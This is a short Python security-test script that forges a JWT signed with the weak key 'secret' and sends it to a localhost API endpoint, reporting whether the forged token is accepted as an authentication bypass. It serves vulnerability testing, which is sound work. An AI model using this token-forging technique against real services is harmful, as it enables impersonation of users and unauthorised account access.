#!/usr/bin/env python3
"""
JWT Authentication Bypass (Weak Signing Key) Test Script
Target: GET /users/v1/me
Base URL: http://localhost:5002

This script attempts to bypass JWT authentication by forging a token with a weak signing key.
If the API accepts the forged token and returns valid user data, it may be vulnerable.
Requires: PyJWT (install via pip install pyjwt)
"""
import requests
import jwt
import time

base_url = "http://localhost:5002"
url = f"{base_url}/users/v1/me"
print(f"Testing JWT Authentication Bypass on URL: {url}")

# Create a forged JWT token.
payload = {
    "user": "name1",
    "iat": int(time.time())
}
# Use a weak key for signing (e.g., "secret")
weak_key = "secret"
token = jwt.encode(payload, weak_key, algorithm="HS256")

headers = {
    "Authorization": f"Bearer {token}"
}

try:
    response = requests.get(url, headers=headers, timeout=10)
    print("Status Code:", response.status_code)
    print("Response Body:")
    print(response.text)
    # If the forged token is accepted, then the API may be vulnerable.
    if response.status_code == 200 and "name1" in response.text:
        print("Potential JWT Authentication Bypass vulnerability detected!")
    else:
        print("No JWT Authentication Bypass vulnerability detected based on response content.")
except Exception as e:
    print("Error during request:", e)
